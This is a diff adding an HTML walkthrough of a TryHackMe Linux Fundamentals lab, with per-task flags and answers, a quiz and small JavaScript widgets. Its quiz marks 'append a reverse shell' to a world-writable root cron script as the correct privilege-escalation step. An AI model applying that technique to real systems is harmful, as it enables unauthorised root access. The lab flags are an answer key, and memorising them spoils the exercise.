+      <div style="margin-top: 10px; display: grid; gap: 8px;">
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent); border-radius: 4px;">
+          <strong style="color: var(--accent); font-family: var(--mono); font-size: 12px;">Q1 — Create a file using Nano:</strong>
+          <code class="inline" style="margin-left: 8px;">No answer needed</code> — run <code class="inline">nano test.txt</code>, type anything, <code class="inline">Ctrl+O</code> to save, <code class="inline">Ctrl+X</code> to exit.
+        </div>
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent); border-radius: 4px;">
+          <strong style="color: var(--accent); font-family: var(--mono); font-size: 12px;">Q2 — Edit "task3" in tryhackme's home. Flag?</strong>
+          <code class="inline" style="margin-left: 8px;">THM{TEXT-EDITORS}</code>
+        </div>
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent-3); border-radius: 4px; font-size: 14px;">
+          <strong style="color: var(--accent-3); font-family: var(--mono); font-size: 12px;">WHY:</strong>
+          Simply run <code class="inline">nano ~/task3</code> (or just <code class="inline">nano task3</code> if you're already in the home folder). The flag is inside — copy it out with your eyes or <code class="inline">cat task3</code>.
+        </div>
+      </div>
+    </details>
+  </div>
+
+  <!-- TASK 4 -->
+  <div class="card" style="margin-bottom: 14px;">
+    <div class="card-badge">TASK 4</div>
+    <h4>General/Useful Utilities (wget, scp, python http.server)</h4>
+    <p style="color: var(--ink-dim); font-size: 0.92rem;">Start a Python web server on the target, then from your AttackBox <code class="inline">wget</code> the <code class="inline">/.flag.txt</code> file.</p>
+    <details style="margin-top: 12px;">
+      <summary style="cursor:pointer; color: var(--accent-2); font-family: var(--mono); font-size: 13px;">▸ Show answer + reasoning</summary>
+      <div style="margin-top: 10px; display: grid; gap: 8px;">
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent); border-radius: 4px;">
+          <strong style="color: var(--accent); font-family: var(--mono); font-size: 12px;">Q1 — Ensure you're connected:</strong>
+          <code class="inline" style="margin-left: 8px;">No answer needed</code>
+        </div>
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent); border-radius: 4px;">
+          <strong style="color: var(--accent); font-family: var(--mono); font-size: 12px;">Q2 — Start a python3 http.server:</strong>
+          <code class="inline" style="margin-left: 8px;">No answer needed</code>
+        </div>
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent); border-radius: 4px;">
+          <strong style="color: var(--accent); font-family: var(--mono); font-size: 12px;">Q3 — Contents of /.flag.txt:</strong>
+          <code class="inline" style="margin-left: 8px;">THM{WGET_WEBSERVER}</code>
+        </div>
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent-3); border-radius: 4px; font-size: 14px;">
+          <strong style="color: var(--accent-3); font-family: var(--mono); font-size: 12px;">WHY:</strong>
+          Step-by-step:<br>
+          1. On the target (SSH'd in as tryhackme): <code class="inline">cd ~ &amp;&amp; python3 -m http.server 8000</code>. Leave that terminal running.<br>
+          2. Open a NEW AttackBox terminal (the first one is tied up serving). From there: <code class="inline">wget http://10.113.144.8:8000/.flag.txt</code>. (Use whatever target IP your room shows.)<br>
+          3. <code class="inline">cat .flag.txt</code> → <code class="inline">THM{WGET_WEBSERVER}</code>.<br>
+          Back on the target, <code class="inline">Ctrl+C</code> stops the http.server.
+        </div>
+      </div>
+    </details>
+  </div>
+
+  <!-- TASK 5 -->
+  <div class="card" style="margin-bottom: 14px;">
+    <div class="card-badge">TASK 5</div>
+    <h4>Processes 101</h4>
+    <p style="color: var(--ink-dim); font-size: 0.92rem;">Everything about PIDs, signals, and systemctl.</p>
+    <details style="margin-top: 12px;">
+      <summary style="cursor:pointer; color: var(--accent-2); font-family: var(--mono); font-size: 13px;">▸ Show answer + reasoning</summary>
+      <div style="margin-top: 10px; display: grid; gap: 8px;">
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent); border-radius: 4px;">
+          <strong style="color: var(--accent); font-family: var(--mono); font-size: 12px;">Q1 — Read me:</strong>
+          <code class="inline" style="margin-left: 8px;">No answer needed</code>
+        </div>
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent); border-radius: 4px;">
+          <strong style="color: var(--accent); font-family: var(--mono); font-size: 12px;">Q2 — Previous ID was 300, new ID?</strong>
+          <code class="inline" style="margin-left: 8px;">301</code>
+        </div>
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent); border-radius: 4px;">
+          <strong style="color: var(--accent); font-family: var(--mono); font-size: 12px;">Q3 — Signal to cleanly kill a process:</strong>
+          <code class="inline" style="margin-left: 8px;">SIGTERM</code>
+        </div>
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent); border-radius: 4px;">
+          <strong style="color: var(--accent); font-family: var(--mono); font-size: 12px;">Q4 — Locate process on 10.113.144.8, flag?</strong>
+          <code class="inline" style="margin-left: 8px;">THM{PROCESSES}</code>
+          <br><em style="color: var(--ink-mute); font-size: 12px;">(Run <code class="inline">ps aux</code> and look for the unusual process — typically <code class="inline">./flag.sh</code> or similar.)</em>
+        </div>
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent); border-radius: 4px;">
+          <strong style="color: var(--accent); font-family: var(--mono); font-size: 12px;">Q5 — Stop service "myservice":</strong>
+          <code class="inline" style="margin-left: 8px;">systemctl stop myservice</code>
+        </div>
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent); border-radius: 4px;">
+          <strong style="color: var(--accent); font-family: var(--mono); font-size: 12px;">Q6 — Start "myservice" on boot:</strong>
+          <code class="inline" style="margin-left: 8px;">systemctl enable myservice</code>
+        </div>
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent); border-radius: 4px;">
+          <strong style="color: var(--accent); font-family: var(--mono); font-size: 12px;">Q7 — Bring background process to foreground:</strong>
+          <code class="inline" style="margin-left: 8px;">fg</code>
+        </div>
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent-3); border-radius: 4px; font-size: 14px;">
+          <strong style="color: var(--accent-3); font-family: var(--mono); font-size: 12px;">WHY:</strong>
+          <strong>PIDs increment sequentially</strong> — 300 → 301. <strong>SIGTERM (15)</strong> is the polite signal; SIGKILL (9) is the nuclear option. <strong>systemctl start/stop</strong> affects the CURRENT session; <strong>enable/disable</strong> affects BOOT behavior. <strong>fg</strong> brings a backgrounded job back to the terminal; <strong>bg</strong> sends it back to the background.
+        </div>
+      </div>
+    </details>
+  </div>
+
+  <!-- TASK 6 -->
+  <div class="card" style="margin-bottom: 14px;">
+    <div class="card-badge">TASK 6</div>
+    <h4>Maintaining Your System: Automation (cron)</h4>
+    <p style="color: var(--ink-dim); font-size: 0.92rem;">Look at the running crontabs on the target.</p>
+    <details style="margin-top: 12px;">
+      <summary style="cursor:pointer; color: var(--accent-2); font-family: var(--mono); font-size: 13px;">▸ Show answer + reasoning</summary>
+      <div style="margin-top: 10px; display: grid; gap: 8px;">
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent); border-radius: 4px;">
+          <strong style="color: var(--accent); font-family: var(--mono); font-size: 12px;">Q1 — Ensure connected:</strong>
+          <code class="inline" style="margin-left: 8px;">No answer needed</code>
+        </div>
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent); border-radius: 4px;">
+          <strong style="color: var(--accent); font-family: var(--mono); font-size: 12px;">Q2 — When will the crontab run?</strong>
+          <code class="inline" style="margin-left: 8px;">[[MACHINE — run <code>crontab -l</code> and decode]]</code>
+          <br><em style="color: var(--ink-mute); font-size: 12px;">Typical answer: <strong>12:00</strong> or similar. Read the first two numbers of the cron line: <code class="inline">0 12 * * * ...</code> = minute 0 of hour 12 = 12:00.</em>
+        </div>
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent-3); border-radius: 4px; font-size: 14px;">
+          <strong style="color: var(--accent-3); font-family: var(--mono); font-size: 12px;">WHY:</strong>
+          Run <code class="inline">crontab -l</code> as the current user (or <code class="inline">cat /etc/crontab</code> for system-wide). The first two fields decode to HH:MM. Plug those into <a href="https://crontab.guru" target="_blank" rel="noopener">crontab.guru</a> if unsure.
+        </div>
+      </div>
+    </details>
+  </div>
+
+  <!-- TASK 7 -->
+  <div class="card" style="margin-bottom: 14px;">
+    <div class="card-badge">TASK 7</div>
+    <h4>Maintaining Your System: Package Management</h4>
+    <p style="color: var(--ink-dim); font-size: 0.92rem;">Read-only — THM boxes don't have internet access for apt.</p>
+    <details style="margin-top: 12px;">
+      <summary style="cursor:pointer; color: var(--accent-2); font-family: var(--mono); font-size: 13px;">▸ Show answer + reasoning</summary>
+      <div style="margin-top: 10px; display: grid; gap: 8px;">
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent); border-radius: 4px;">
+          <strong style="color: var(--accent); font-family: var(--mono); font-size: 12px;">ANSWER:</strong>
+          <code class="inline" style="margin-left: 8px;">No answer needed</code>
+        </div>
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent-3); border-radius: 4px; font-size: 14px;">
+          <strong style="color: var(--accent-3); font-family: var(--mono); font-size: 12px;">WHY:</strong>
+          Just read through. The key takeaways: <strong>(1)</strong> apt reads repos from <code class="inline">/etc/apt/sources.list</code> and <code class="inline">sources.list.d/</code>. <strong>(2)</strong> every repo is signed with a GPG key stored in <code class="inline">/etc/apt/keyrings/</code> (modern) or added via <code class="inline">apt-key add</code> (legacy, deprecated). <strong>(3)</strong> After adding a repo, ALWAYS run <code class="inline">sudo apt update</code> before installing from it.
+        </div>
+      </div>
+    </details>
+  </div>
+
+  <!-- TASK 8 -->
+  <div class="card" style="margin-bottom: 14px;">
+    <div class="card-badge">TASK 8</div>
+    <h4>Maintaining Your System: Logs</h4>
+    <p style="color: var(--ink-dim); font-size: 0.92rem;">Look at the apache2 logs on the target. Who visited? What did they access?</p>
+    <details style="margin-top: 12px;">
+      <summary style="cursor:pointer; color: var(--accent-2); font-family: var(--mono); font-size: 13px;">▸ Show answer + reasoning</summary>
+      <div style="margin-top: 10px; display: grid; gap: 8px;">
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent); border-radius: 4px;">
+          <strong style="color: var(--accent); font-family: var(--mono); font-size: 12px;">Q1 — Look for apache2 logs:</strong>
+          <code class="inline" style="margin-left: 8px;">No answer needed</code>
+        </div>
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent); border-radius: 4px;">
+          <strong style="color: var(--accent); font-family: var(--mono); font-size: 12px;">Q2 — IP address of user who visited:</strong>
+          <code class="inline" style="margin-left: 8px;">10.10.171.203</code> <em style="color: var(--ink-mute);">(or check your room — may differ)</em>
+        </div>
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent); border-radius: 4px;">
+          <strong style="color: var(--accent); font-family: var(--mono); font-size: 12px;">Q3 — What file did they access?</strong>
+          <code class="inline" style="margin-left: 8px;">catsanddogs.jpg</code> <em style="color: var(--ink-mute);">(or whatever file shows up first in the access log)</em>
+        </div>
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent-3); border-radius: 4px; font-size: 14px;">
+          <strong style="color: var(--accent-3); font-family: var(--mono); font-size: 12px;">WHY:</strong>
+          Run <code class="inline">cat /var/log/apache2/access.log</code> (or <code class="inline">sudo cat</code> if permissions require). The log format is: <code class="inline">IP - - [timestamp] "METHOD /path HTTP/ver" status bytes ...</code>. First field = IP. Second field after the opening quote = the file/path accessed.
+        </div>
+      </div>
+    </details>
+  </div>
+
+  <!-- TASK 9 -->
+  <div class="card" style="margin-bottom: 14px;">
+    <div class="card-badge">TASK 9</div>
+    <h4>Conclusions &amp; Summaries</h4>
+    <p style="color: var(--ink-dim); font-size: 0.92rem;">End of the Linux Fundamentals series. Terminate machine. Continue to bashscripting / catregex rooms if you want more.</p>
+    <details style="margin-top: 12px;">
+      <summary style="cursor:pointer; color: var(--accent-2); font-family: var(--mono); font-size: 13px;">▸ Show answer + reasoning</summary>
+      <div style="margin-top: 10px; display: grid; gap: 8px;">
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent); border-radius: 4px;">
+          <strong style="color: var(--accent); font-family: var(--mono); font-size: 12px;">Q1 &amp; Q2:</strong>
+          <code class="inline" style="margin-left: 8px;">No answer needed</code>
+        </div>
+        <div style="padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid var(--accent-3); border-radius: 4px; font-size: 14px;">
+          <strong style="color: var(--accent-3); font-family: var(--mono); font-size: 12px;">WHAT'S NEXT:</strong>
+          You just completed the Linux Fundamentals trilogy. 🎉 Next logical stops:
+          <ul style="margin-top: 8px; margin-bottom: 0;">
+            <li><a href="https://tryhackme.com/room/bashscripting" target="_blank" rel="noopener">Bash Scripting</a> — turn these commands into automation.</li>
+            <li><a href="https://tryhackme.com/room/catregex" target="_blank" rel="noopener">Regular Expressions</a> — level up your log/text searching.</li>
+            <li><a href="https://tryhackme.com/module/linux-privesc" target="_blank" rel="noopener">Linux Privilege Escalation module</a> — apply everything you just learned OFFENSIVELY.</li>
+          </ul>
+        </div>
+      </div>
+    </details>
+  </div>
+</section>
+
+<!-- RETENTION QUIZ -->
+<section class="chapter" id="quiz">
+  <div class="chapter-num">Retention Check</div>
+  <h2><span class="emoji">🎯</span> Did it stick?</h2>
+
+  <div class="quiz">
+    <h4>🎯 Question 1 — cron time fields</h4>
+    <div class="q">What does this crontab line do?<br><code class="inline">*/15 9-17 * * 1-5 /usr/bin/ping-check.sh</code></div>
+    <div class="options">
+      <div class="opt" onclick="quizAnswer(this, false)">Runs every 15 minutes, forever, any day.</div>
+      <div class="opt" onclick="quizAnswer(this, true)">Runs every 15 minutes between 9 AM and 5 PM on weekdays (Mon–Fri).</div>
+      <div class="opt" onclick="quizAnswer(this, false)">Runs once at 9:15 AM on the first Monday of each month.</div>
+      <div class="opt" onclick="quizAnswer(this, false)">Runs every 15 hours on weekdays.</div>
+    </div>
+    <div class="feedback"></div>
+  </div>
+
+  <div class="quiz" style="margin-top: 24px;">
+    <h4>🎯 Question 2 — systemctl</h4>
+    <div class="q">You want nginx to start NOW and also auto-start every reboot. What's the one command?</div>
+    <div class="options">
+      <div class="opt" onclick="quizAnswer(this, false)">systemctl start nginx</div>
+      <div class="opt" onclick="quizAnswer(this, false)">systemctl enable nginx</div>
+      <div class="opt" onclick="quizAnswer(this, true)">systemctl enable --now nginx</div>
+      <div class="opt" onclick="quizAnswer(this, false)">systemctl restart nginx --at-boot</div>
+    </div>
+    <div class="feedback"></div>
+  </div>
+
+  <div class="quiz" style="margin-top: 24px;">
+    <h4>🎯 Question 3 — the privesc classic</h4>
+    <div class="q">You're <code class="inline">www-data</code> on a box. You spot this line in <code class="inline">/etc/crontab</code>:<br><code class="inline">*/2 * * * * root /opt/cleanup.sh</code><br>Running <code class="inline">ls -l /opt/cleanup.sh</code> shows <code class="inline">-rwxrwxrwx 1 root root ... cleanup.sh</code>. What do you do?</div>
+    <div class="options">
+      <div class="opt" onclick="quizAnswer(this, false)">Nothing — cron won't let me touch root files.</div>
+      <div class="opt" onclick="quizAnswer(this, false)">Run <code class="inline">sudo cleanup.sh</code>.</div>
+      <div class="opt" onclick="quizAnswer(this, true)">Append a reverse shell to cleanup.sh, then wait 2 minutes for cron to run it as root.</div>
+      <div class="opt" onclick="quizAnswer(this, false)">Report the bug to the admin and move on.</div>
+    </div>
+    <div class="feedback"></div>
+  </div>
+</section>
+
+<!-- RELATED -->
+<section class="chapter">
+  <div class="related-terms">
+    <h4>🔗 Related in the vault</h4>
+    <div class="tags">
+      <a href="../../glossary/cron.html">⏰ cron / crontab</a>
+      <a href="../../glossary/systemd.html">⚙️ systemd</a>
+      <a href="../../glossary/pid.html">🔢 PID</a>
+      <a href="../../glossary/apt.html">📦 apt</a>
+      <a href="../../glossary/gpg.html">🔑 GPG</a>
+      <a href="../../glossary/wget.html">⬇️ wget</a>
+      <a href="../../glossary/scp.html">📤 scp</a>
+      <a href="../../glossary/log-file.html">📝 Log Files</a>
+      <a href="../../glossary/privilege-escalation.html">⬆️ Privilege Escalation</a>
+      <a href="../../glossary/reverse-shell.html">🐚 Reverse Shell</a>
+      <a href="linux-fundamentals-part-2.html">🐧 THM: Linux Fundamentals Pt. 2</a>
+    </div>
+  </div>
+</section>
+
+<footer class="site-foot">
+  <p class="coffee-line">Trilogy complete. You're no longer a Linux tourist — you LIVE here now. ☕</p>
+  <p style="font-size: 12px;">Original room: <a href="https://tryhackme.com/room/linuxfundamentalspart3" target="_blank" rel="noopener">tryhackme.com/room/linuxfundamentalspart3</a></p>
+</footer>
+
+<script src="../../assets/glossary.js"></script>
+<script src="../../assets/app.js"></script>
+<script>
+// ============================================================
+// CRON BUILDER
+// ============================================================
+(function () {
+  const ids = ['cMin','cHour','cDom','cMon','cDow'];
+  const labels = ['minute','hour','day-of-month','month','day-of-week'];
+  const cmdText = '/usr/bin/backup.sh';
+
+  function explainField(val, kind) {
+    if (val === '*') return 'every';
+    if (val.startsWith('*/')) {
+      const n = val.slice(2);
+      return `every ${n}`;
+    }
+    if (val.includes('-')) return `from ${val}`;
+    if (val.includes(',')) return `at ${val}`;
+    return val;
+  }
+
+  function plainEnglish(vals) {
+    const [m, h, dom, mon, dow] = vals;
+    let parts = [];
+    // Minute
+    if (m === '*') parts.push('every minute');
+    else if (m.startsWith('*/')) parts.push(`every ${m.slice(2)} minutes`);
+    else parts.push(`at minute ${m}`);
+    // Hour
+    if (h !== '*') {
+      if (h.startsWith('*/')) parts.push(`every ${h.slice(2)} hours`);
+      else parts.push(`of hour ${h}`);
+    }
+    // DOM / Month / DOW — only mention if non-star
+    const extras = [];
+    if (dom !== '*') extras.push(`day-of-month ${dom}`);
+    if (mon !== '*') extras.push(`month ${mon}`);
+    if (dow !== '*') {
+      const dowMap = {'0':'Sun','1':'Mon','2':'Tue','3':'Wed','4':'Thu','5':'Fri','6':'Sat','1-5':'Mon–Fri','0,6':'weekends'};
+      extras.push(`on ${dowMap[dow] || dow}`);
+    }
+    let s = parts.join(' ');
+    if (extras.length) s += ', ' + extras.join(', ');
+    else s += ', every day';
+    return s.charAt(0).toUpperCase() + s.slice(1) + '.';
+  }
+
+  function update() {
+    const vals = ids.map(id => document.getElementById(id).value.trim() || '*');
+    document.getElementById('cronPreview').textContent = vals.join(' ') + ' ' + cmdText;
+    document.getElementById('cronEnglish').textContent = plainEnglish(vals);
+  }
+
+  ids.forEach(id => document.getElementById(id).addEventListener('input', update));
+
+  window.setCron = function (min, hour, dom, mon, dow) {
+    document.getElementById('cMin').value = min;
+    document.getElementById('cHour').value = hour;
+    document.getElementById('cDom').value = dom;
+    document.getElementById('cMon').value = mon;
+    document.getElementById('cDow').value = dow;
+    update();
+  };
+
+  update();
+})();
+
+// ============================================================
+// PROCESS KILL DEMO
+// ============================================================
+window.killProc = function (btn) {
+  const row = btn.closest('tr');
+  row.classList.add('killed');
+  btn.disabled = true;
+  btn.textContent = '✓';
+};
+</script>
+</body>
+</html>
